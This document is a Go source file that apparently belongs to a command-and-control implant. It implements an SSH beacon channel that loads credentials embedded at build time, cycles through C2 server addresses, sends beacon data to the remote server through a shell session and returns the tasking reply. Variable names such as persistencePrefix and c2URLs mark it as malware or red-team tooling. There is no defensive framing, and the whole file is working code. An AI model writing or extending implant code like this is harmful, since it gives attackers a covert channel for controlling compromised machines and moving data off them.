//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	sshUser     string
	sshPassword string
	sshKey      ssh.Signer
	sshHostKey  ssh.PublicKey
	sshInitOnce sync.Once
)

func initSSHConfig() {
	sshInitOnce.Do(func() {
		sshUser = SSHUserStr
		if sshUser == "" {
			sshUser = persistencePrefix
		}
		sshPassword = SSHPasswordStr
		if SSHKeyStr != "" {
			keyPEM, err := base64.StdEncoding.DecodeString(SSHKeyStr)
			if err == nil {
				parsed, err := ssh.ParsePrivateKey(keyPEM)
				if err == nil {
					sshKey = parsed
				} else if Debug {
					fmt.Printf("[!] SSH key parse failed: %v\n", err)
				}
			} else if Debug {
				fmt.Printf("[!] SSH key base64 decode failed: %v\n", err)
			}
		}
		// Optional pinned server host public key (base64 of ssh.MarshalAuthorizedKey line or raw wire format)
		if SSHHostKeyStr != "" {
			raw, err := base64.StdEncoding.DecodeString(SSHHostKeyStr)
			if err != nil {
				raw = []byte(SSHHostKeyStr)
			}
			if pk, _, _, _, err := ssh.ParseAuthorizedKey(raw); err == nil {
				sshHostKey = pk
			} else if pk, err := ssh.ParsePublicKey(raw); err == nil {
				sshHostKey = pk
			} else if Debug {
				fmt.Printf("[!] SSH host key parse failed: %v\n", err)
			}
		}
	})
}

// sshHostKeyCallback pins the server key when SSHHostKeyStr was set at build time;
// otherwise it fails closed — no silent InsecureIgnoreHostKey fallback (MITM surface).
func sshHostKeyCallback() ssh.HostKeyCallback {
	initSSHConfig()
	if sshHostKey != nil {
		return func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			if subtleEqualSSHKeys(sshHostKey, key) {
				return nil
			}
			return fmt.Errorf("ssh: host key mismatch for %s", hostname)
		}
	}
	return func(hostname string, remote net.Addr, key ssh.PublicKey) error {
		return fmt.Errorf("ssh: no host key pin configured, refusing connection to %s", hostname)
	}
}

func subtleEqualSSHKeys(a, b ssh.PublicKey) bool {
	if a == nil || b == nil {
		return false
	}
	return string(a.Marshal()) == string(b.Marshal())
}

func sendSSHBeacon(body []byte) []byte {
	initSSHConfig()
	startIdx := int(currentC2Idx.Load())
	urls := c2URLsSnapshot()
	for i := 0; i < len(urls); i++ {
		idx := (startIdx + i) % len(urls)
		c2URL := urls[idx]

		if !strings.HasPrefix(c2URL, "ssh://") {
			continue
		}

		addr := strings.TrimPrefix(c2URL, "ssh://")
		if !strings.Contains(addr, ":") {
			addr = addr + ":22"
		}

		authMethods := []ssh.AuthMethod{}
		if sshPassword != "" {
			authMethods = append(authMethods, ssh.Password(sshPassword))
		}
		if sshKey != nil {
			authMethods = append(authMethods, ssh.PublicKeys(sshKey))
		}
		// Fallback: keyboard-interactive with empty responses (try no-password)
		if len(authMethods) == 0 {
			authMethods = append(authMethods, ssh.KeyboardInteractive(func(name, instruction string, questions []string, echos []bool) ([]string, error) {
				return make([]string, len(questions)), nil
			}))
		}

		cfg := &ssh.ClientConfig{
			User:            sshUser,
			Auth:            authMethods,
			HostKeyCallback: sshHostKeyCallback(),
			Timeout:         30 * time.Second,
		}

		client, err := ssh.Dial("tcp", addr, cfg)
		if err != nil {
			if Debug {
				fmt.Printf("[!] SSH dial to %s failed: %v\n", addr, err)
			}
			continue
		}

		session, err := client.NewSession()
		if err != nil {
			client.Close()
			if Debug {
				fmt.Printf("[!] SSH session to %s failed: %v\n", addr, err)
			}
			continue
		}

		stdout, err := session.StdoutPipe()
		if err != nil {
			session.Close()
			client.Close()
			continue
		}

		stdin, err := session.StdinPipe()
		if err != nil {
			session.Close()
			client.Close()
			continue
		}

		if err := session.Start("/bin/sh -c 'cat'"); err != nil {
			stdin.Close()
			session.Close()
			client.Close()
			if Debug {
				fmt.Printf("[!] SSH exec on %s failed: %v\n", addr, err)
			}
			continue
		}

		stdin.Write(body)
		stdin.Close()

		type sshReadResult struct {
			data []byte
			err  error
		}
		sshReadDone := make(chan sshReadResult, 1)
		go func() {
			data, e := io.ReadAll(io.LimitReader(stdout, 16*1024*1024))
			sshReadDone <- sshReadResult{data, e}
		}()
		var response []byte
		var readErr error
		select {
		case r := <-sshReadDone:
			response, readErr = r.data, r.err
		case <-time.After(30 * time.Second):
			// A stalled C2 on the SSH session would otherwise block io.ReadAll
			// forever and freeze the entire beacon loop; tear it down.
			session.Close()
			client.Close()
			return nil
		}
		session.Wait()
		session.Close()
		client.Close()

		if readErr != nil {
			if Debug {
				fmt.Printf("[!] SSH read from %s failed: %v\n", addr, readErr)
			}
			continue
		}

		currentC2Idx.Store(int32(idx))
		if Debug {
			fmt.Printf("[+] SSH Beacon OK from %s, response %d bytes\n", addr, len(response))
		}
		return response
	}

	if Debug {
		fmt.Println("[!] All SSH endpoints failed, no fallback available")
	}
	return nil
}
